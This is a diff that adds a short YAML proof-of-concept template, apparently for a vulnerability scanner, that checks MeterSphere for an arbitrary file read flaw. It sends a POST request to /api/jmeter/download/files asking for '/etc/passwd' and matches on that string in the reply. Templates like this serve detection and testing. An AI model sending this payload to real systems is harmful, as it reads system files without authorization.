@@ -1,0 +1,17 @@
+name: MeterSphere-fileread
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: POST
+      path: /api/jmeter/download/files
+      headers:
+        Content-Type: application/json
+        Accept-Encoding: gzip
+      body: |
+        {"reportId":"pass","bodyFiles":[{"id":"aaa","name":"/etc/passwd"}]}
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"/etc/passwd")
+  author: 
+  links:
+  
